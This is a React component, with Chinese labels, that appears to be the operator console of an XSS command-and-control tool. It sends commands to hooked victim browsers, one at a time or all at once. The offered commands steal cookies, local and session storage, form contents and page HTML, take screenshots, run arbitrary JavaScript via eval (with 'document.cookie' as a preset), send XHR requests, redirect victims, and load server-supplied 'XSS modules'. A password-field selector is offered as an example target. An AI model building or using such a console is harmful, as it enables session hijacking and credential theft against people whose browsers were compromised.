import React, { useState, useEffect } from 'react';
import { Card, Button, Select, Input } from './ui';
import { useApi } from '../hooks/useApi';
import { COMMAND_TYPES } from '../types';
import { API_BASE_URL } from '../constants/api';
import authService from '../services/auth';
import './CommandPanel.css';

const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
  const [selectedCommand, setSelectedCommand] = useState('');
  const [customCode, setCustomCode] = useState('');
  const [domSelector, setDomSelector] = useState('');
  const [xhrConfig, setXhrConfig] = useState({
    method: 'GET',
    url: '',
    headers: '{}',
    data: ''
  });
  const [xssModules, setXssModules] = useState([]);
  const [selectedModuleName, setSelectedModuleName] = useState('');
  const [moduleParams, setModuleParams] = useState({});
  const [useXssModule, setUseXssModule] = useState(false);
  const { sendCommandToAll, sendCommandToTarget, loading } = useApi();

  useEffect(() => {
    fetchXssModules();
  }, []);

  const fetchXssModules = async () => {
    try {
      const token = authService.getToken();
      const response = await fetch(`${API_BASE_URL}/api/xss-modules`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });
      
      const data = await response.json();
      if (data.status === 'success') {
        setXssModules(data.data || []);
      }
    } catch (error) {
      console.error('获取XSS模块失败:', error);
    }
  };

  const selectedModule = xssModules.find(m => m.name === selectedModuleName);

  const commandOptions = [
    { value: COMMAND_TYPES.COOKIE, label: '获取 Cookie' },
    { value: COMMAND_TYPES.LOCATION, label: '获取位置信息' },
    { value: COMMAND_TYPES.LOCAL_STORAGE, label: '获取本地存储' },
    { value: COMMAND_TYPES.SESSION_STORAGE, label: '获取会话存储' },
    { value: COMMAND_TYPES.FORMS, label: '获取表单信息' },
    { value: COMMAND_TYPES.USER_AGENT, label: '获取用户代理' },
    { value: COMMAND_TYPES.DOM, label: '获取 DOM 元素' },
    { value: COMMAND_TYPES.EVAL, label: '执行 JavaScript' },
    { value: COMMAND_TYPES.XHR, label: 'HTTP 请求' },
    { value: COMMAND_TYPES.SCREENSHOT, label: '页面截图' },
    { value: COMMAND_TYPES.HTML, label: '获取页面 HTML' }
  ];

  // 将XSS模块转换为下拉选项
  const moduleOptions = xssModules.map(module => ({
    value: module.name,
    label: module.display_name
  }));

  const handleModuleChange = (moduleName) => {
    setSelectedModuleName(moduleName);
    
    // 初始化参数默认值
    const module = xssModules.find(m => m.name === moduleName);
    const params = {};
    if (module && module.params) {
      module.params.forEach(param => {
        params[param.name] = param.default || '';
      });
    }
    setModuleParams(params);
  };

  const handleParamChange = (paramName, value) => {
    setModuleParams(prev => ({
      ...prev,
      [paramName]: value
    }));
  };

  const renderParamInput = (param) => {
    const value = moduleParams[param.name] || '';
    
    if (param.type === 'number') {
      return (
        <Input
          key={param.name}
          label={`${param.description}${param.required ? ' *' : ''}`}
          type="number"
          value={value}
          onChange={(e) => handleParamChange(param.name, e.target.value)}
          placeholder={param.default?.toString() || ''}
          required={param.required}
        />
      );
    }
    
    if (param.type === 'boolean') {
      return (
        <div key={param.name} className="command-panel__param-group">
          <label className="command-panel__label">
            {param.description}{param.required ? ' *' : ''}
          </label>
          <Select
            value={value}
            onChange={(e) => handleParamChange(param.name, e.target.value)}
            options={[
              { value: 'true', label: '是' },
              { value: 'false', label: '否' }
            ]}
            placeholder="选择..."
          />
        </div>
      );
    }
    
    if (param.type === 'array') {
      return (
        <div key={param.name} className="command-panel__param-group">
          <label className="command-panel__label">
            {param.description}{param.required ? ' *' : ''}
          </label>
          <textarea
            className="command-panel__textarea"
            value={value}
            onChange={(e) => handleParamChange(param.name, e.target.value)}
            placeholder={param.default || '["item1", "item2"]'}
            rows={3}
          />
          <div className="command-panel__param-hint">
            输入JSON数组格式，例如: ["item1", "item2", "item3"]
          </div>
        </div>
      );
    }
    
    // 默认为字符串输入
    return (
      <Input
        key={param.name}
        label={`${param.description}${param.required ? ' *' : ''}`}
        value={value}
        onChange={(e) => handleParamChange(param.name, e.target.value)}
        placeholder={param.default || ''}
        required={param.required}
      />
    );
  };

  const getCommandArgs = () => {
    const args = {};
    
    // 如果选择了XSS模块，使用模块参数
    if (useXssModule && selectedModule) {
      selectedModule.params?.forEach(param => {
        const value = moduleParams[param.name];
        if (value !== undefined && value !== '') {
          // 类型转换
          if (param.type === 'number') {
            args[param.name] = Number(value);
          } else if (param.type === 'boolean') {
            args[param.name] = value === 'true';
          } else if (param.type === 'array') {
            try {
              args[param.name] = JSON.parse(value);
            } catch (e) {
              // 如果解析失败，作为字符串处理
              args[param.name] = value;
            }
          } else {
            args[param.name] = value;
          }
        }
      });
      return args;
    }
    
    // 传统命令的参数处理
    if (selectedCommand === COMMAND_TYPES.EVAL && customCode.trim()) {
      args.code = customCode.trim();
    }
    
    if (selectedCommand === COMMAND_TYPES.DOM && domSelector.trim()) {
      args.selector = domSelector.trim();
    }
    
    if (selectedCommand === COMMAND_TYPES.XHR) {
      args.method = xhrConfig.method;
      args.url = xhrConfig.url;
      args.async = true;
      
      try {
        args.headers = JSON.parse(xhrConfig.headers);
      } catch (e) {
        args.headers = {};
      }
      
      if (xhrConfig.data.trim()) {
        args.data = xhrConfig.data.trim();
      }
    }
    
    return args;
  };

  const handleExecuteCommand = async () => {
    const commandToExecute = useXssModule ? selectedModuleName : selectedCommand;
    
    if (!commandToExecute) {
      alert('请选择要执行的命令或模块');
      return;
    }

    // 验证必需参数
    if (useXssModule && selectedModule) {
      const missingParams = selectedModule.params?.filter(param => 
        param.required && (!moduleParams[param.name] || moduleParams[param.name] === '')
      );
      
      if (missingParams && missingParams.length > 0) {
        alert(`请填写必需参数: ${missingParams.map(p => p.description).join(', ')}`);
        return;
      }
    }

    try {
      const args = getCommandArgs();
      let result;

      if (selectedClient) {
        result = await sendCommandToTarget(selectedClient.id, commandToExecute, args, projectId);
      } else {
        result = await sendCommandToAll(commandToExecute, args, projectId);
      }

      if (result.status === 'success' && onCommandResult) {
        if (result.data.results && Array.isArray(result.data.results)) {
          result.data.results.forEach(commandResult => {
            onCommandResult(commandResult);
          });
        }
      }
    } catch (error) {
      console.error('命令执行失败:', error);
      alert('命令执行失败: ' + error.message);
    }
  };

  const isExecuteDisabled = (!selectedCommand && !selectedModuleName) || loading;

  return (
    <Card title="命令面板" className="command-panel">
      <div className="command-panel__form">
        <div className="command-panel__target">
          <div className="command-panel__target-label">执行目标:</div>
          <div className="command-panel__target-value">
            {selectedClient ? (
              <span className="command-panel__target-client">
                {selectedClient.id.slice(0, 8)}... (单个客户端)
              </span>
            ) : (
              <span className="command-panel__target-all">
                所有连接的客户端
              </span>
            )}
          </div>
        </div>

        {/* 模式选择 */}
        <div className="command-panel__mode-selector">
          <div className="command-panel__mode-tabs">
            <button
              type="button"
              className={`command-panel__mode-tab ${!useXssModule ? 'active' : ''}`}
              onClick={() => {
                setUseXssModule(false);
                setSelectedModuleName('');
                setModuleParams({});
              }}
            >
              传统命令
            </button>
            <button
              type="button"
              className={`command-panel__mode-tab ${useXssModule ? 'active' : ''}`}
              onClick={() => {
                setUseXssModule(true);
                setSelectedCommand('');
                setCustomCode('');
                setDomSelector('');
              }}
            >
              XSS模块 ({xssModules.length})
            </button>
          </div>
        </div>

        {!useXssModule ? (
          <Select
            label="选择命令"
            value={selectedCommand}
            onChange={(e) => setSelectedCommand(e.target.value)}
            options={commandOptions}
            placeholder="请选择要执行的命令"
            required
          />
        ) : (
          <>
            <Select
              label="选择XSS模块"
              value={selectedModuleName}
              onChange={(e) => handleModuleChange(e.target.value)}
              options={moduleOptions}
              placeholder="请选择要执行的XSS模块"
              required
            />
            
            {/* 简单测试：直接显示redirect模块的参数 */}
            {selectedModuleName === 'redirect' && (
              <div className="command-panel__module-params">
                <div className="command-panel__params-title">模块参数</div>
                <Input
                  label="要跳转到的目标URL *"
                  value={moduleParams.url || ''}
                  onChange={(e) => handleParamChange('url', e.target.value)}
                  placeholder="https://example.com"
                  required
                />
                <Input
                  label="延迟执行时间（毫秒）"
                  type="number"
                  value={moduleParams.delay || '100'}
                  onChange={(e) => handleParamChange('delay', e.target.value)}
                  placeholder="100"
                />
              </div>
            )}
          </>
        )}

        {/* 显示选中模块的信息 */}
        {selectedModule && (
          <div className="command-panel__module-info">
            <div className="command-panel__module-header">
              <span className="command-panel__module-name">{selectedModule.display_name}</span>
              <span className={`command-panel__risk-badge command-panel__risk-badge--${selectedModule.risk_level?.toLowerCase() || 'medium'}`}>
                {selectedModule.risk_level || '中等'}风险
              </span>
            </div>
            <p className="command-panel__module-description">{selectedModule.description}</p>
            
            {selectedModule.examples && selectedModule.examples.length > 0 && (
              <div className="command-panel__module-examples">
                <div className="command-panel__examples-title">使用示例:</div>
                {selectedModule.examples.map((example, index) => (
                  <div key={index} className="command-panel__example">
                    <div className="command-panel__example-title">{example.title}</div>
                    <div className="command-panel__example-desc">{example.description}</div>
                    <button
                      type="button"
                      className="command-panel__example-btn"
                      onClick={() => {
                        const params = {};
                        Object.entries(example.args || {}).forEach(([key, value]) => {
                          params[key] = value.toString();
                        });
                        setModuleParams(params);
                      }}
                    >
                      应用示例
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* 动态参数输入 */}
        {useXssModule && selectedModule && selectedModule.params && selectedModule.params.length > 0 && (
          <div className="command-panel__module-params">
            <div className="command-panel__params-title">模块参数</div>
            {selectedModule.params.map(param => renderParamInput(param))}
          </div>
        )}

        {selectedCommand === COMMAND_TYPES.EVAL && (
          <div className="command-panel__code-input">
            <label className="command-panel__label">JavaScript 代码</label>
            <textarea
              className="command-panel__textarea"
              value={customCode}
              onChange={(e) => setCustomCode(e.target.value)}
              placeholder="输入要执行的 JavaScript 代码..."
              rows={4}
            />
            <div className="command-panel__code-examples">
              <div className="command-panel__examples-title">常用示例:</div>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.title')}
              >
                获取页面标题
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('window.location.href')}
              >
                获取当前URL
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.cookie')}
              >
                获取Cookie
              </button>
            </div>
          </div>
        )}

        {selectedCommand === COMMAND_TYPES.DOM && (
          <Input
            label="CSS 选择器"
            value={domSelector}
            onChange={(e) => setDomSelector(e.target.value)}
            placeholder="例如: input[type=password], .username"
          />
        )}

        {selectedCommand === COMMAND_TYPES.XHR && (
          <div className="command-panel__xhr-config">
            <div className="command-panel__xhr-row">
              <Select
                label="HTTP 方法"
                value={xhrConfig.method}
                onChange={(e) => setXhrConfig(prev => ({...prev, method: e.target.value}))}
                options={[
                  {value: 'GET', label: 'GET'},
                  {value: 'POST', label: 'POST'},
                  {value: 'PUT', label: 'PUT'},
                  {value: 'DELETE', label: 'DELETE'}
                ]}
              />
              <Input
                label="请求URL"
                value={xhrConfig.url}
                onChange={(e) => setXhrConfig(prev => ({...prev, url: e.target.value}))}
                placeholder="https://example.com/api/data"
                required
              />
            </div>
            <Input
              label="请求头 (JSON格式)"
              value={xhrConfig.headers}
              onChange={(e) => setXhrConfig(prev => ({...prev, headers: e.target.value}))}
              placeholder='{"Content-Type": "application/json"}'
            />
            <div className="command-panel__code-input">
              <label className="command-panel__label">请求数据</label>
              <textarea
                className="command-panel__textarea"
                value={xhrConfig.data}
                onChange={(e) => setXhrConfig(prev => ({...prev, data: e.target.value}))}
                placeholder="POST/PUT请求的数据内容..."
                rows={3}
              />
            </div>
          </div>
        )}

        <div className="command-panel__actions">
          <Button
            variant="primary"
            onClick={handleExecuteCommand}
            disabled={isExecuteDisabled}
            loading={loading}
          >
            执行命令
          </Button>
          
          <Button
            variant="secondary"
            onClick={() => {
              setSelectedCommand('');
              setCustomCode('');
              setDomSelector('');
              setXhrConfig({
                method: 'GET',
                url: '',
                headers: '{}',
                data: ''
              });
              setSelectedModuleName('');
              setModuleParams({});
            }}
            disabled={loading}
          >
            清空
          </Button>
        </div>
      </div>
    </Card>
  );
};

export default CommandPanel;